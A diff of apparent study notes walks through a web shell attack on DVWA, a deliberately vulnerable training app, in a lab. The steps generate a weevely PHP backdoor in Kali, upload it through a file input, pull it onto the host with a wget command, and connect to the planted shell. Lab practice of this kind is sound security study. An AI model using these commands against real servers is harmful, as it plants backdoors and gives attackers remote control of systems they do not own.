@@ -4,9 +4,13 @@
 1. Genrate backdoor in Kali
    - ```weevely generate [password] [file name]```
    -  ```weevely generate 123456 /root/shell.php```
-2. Upload in vulnerable app (DVWA-Low)
-3. Send a request to uploaded php file (run it)
-   - *http://192.168.152.132/dvwa/hackable/uploads/shell.php*
+2. Upload 
+   - we have an input field
+     -  Upload in vulnerable app (DVWA-Low)
+   - we access to system shell
+     - ```wget http://10.20.14.213/shell.txt``` 
+3. Run
+   - Send a request to uploaded php file *"http://192.168.152.132/dvwa/hackable/uploads/shell.php"*
 4. Connect to shell from Kali
    - ```weevely [url o file] [password]```
    -  ```weevely http://192.168.152.132/dvwa/hackable/uploads/shell.php```
